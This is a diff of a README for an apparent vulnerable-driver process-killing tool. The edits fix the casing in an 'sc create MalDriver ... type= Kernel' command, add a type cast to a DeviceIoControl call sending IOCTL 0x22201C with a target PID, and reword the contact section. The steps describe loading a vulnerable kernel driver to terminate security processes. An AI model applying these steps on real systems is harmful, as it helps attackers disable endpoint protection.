@@ -3,7 +3,11 @@
 
 
 
-https://github.com/user-attachments/assets/b21ca709-6b6f-47ad-8bde-065f59ab6a9c
+
+https://github.com/user-attachments/assets/1eda3340-2af2-4136-b74e-be7a3f4b3924
+
+
+
 
 
 
@@ -29,7 +33,7 @@ Any sane threat actor will naturally prioritize this capability to terminate cri
 ### 1. Register a service:
 Launch cmd.exe with Administrator privileges, and register a kernel driver service with type "kernel" and binPath pointing to the vulnerable driver's location.
 ```
-> sc create MalDriver binPath= <path> type= kernel`
+> sc create MalDriver binPath= <path> type= Kernel`
 > sc start MalDriver
 
 ```
@@ -42,7 +46,7 @@ Once loaded, the driver creates a symbolic link for user-mode accessible as \\.\
 
 To send the Malicious IOCTLs we will use DeviceIoControl with code 0x22201C, and buffer containing a PID in its first 4 bytes
 ```
-> DeviceIoControl(self.hDriver, 0x22201C, buffer.as_mut_ptr() as LPVOID, buffer.len(), ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())
+> DeviceIoControl(self.hDriver, 0x22201C, buffer.as_mut_ptr() as LPVOID, buffer.len() as u32, ptr::null_mut(), 0, &mut bytes_returned, ptr::null_mut())
 ```
 
 
@@ -67,7 +71,7 @@ You are responsible for ensuring you have proper authorization before using this
 
 
 ## 🤝 Collaborations 
-This is an ongoing project, contributions and suggestions are welcome! If you have ideas, improvements, or would like to collaborate, feel free to reach out at:
+Contributions and suggestions are welcome! If you have ideas, improvements, or would like to collaborate, feel free to reach out at:
 M0kht4rHacks@protonmail.com
  
 
